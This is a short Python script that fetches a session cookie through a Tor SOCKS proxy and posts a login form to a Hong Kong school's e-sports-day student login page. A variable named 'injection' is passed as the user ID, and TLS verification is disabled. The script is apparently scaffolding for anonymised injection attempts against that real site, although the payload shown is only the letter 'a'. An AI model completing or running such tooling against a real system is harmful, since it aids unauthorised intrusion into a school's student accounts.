import json
import requests
import curlify

url = "--target--"


#DO NOT CHANGE THIS PART
prox = {'http': "socks5://127.0.0.1:9050"}
rcookie = requests.get(url, proxies=prox)
cookies = {"PHPSESSID":rcookie.cookies['PHPSESSID']}
#DO NOT CHANGE THIS PART

injection = "a"
response = requests.post(
    'https://aos.ssc.edu.hk/aos/e-sportsday/student/index.php',
    cookies=cookies,
    data={
    'input_unique_id': injection,
    'input_pass': 'a',
    'btn_login': 'Submit',
	},
    verify=False,
    proxies=prox
)






print("Response content:")
print(response.text)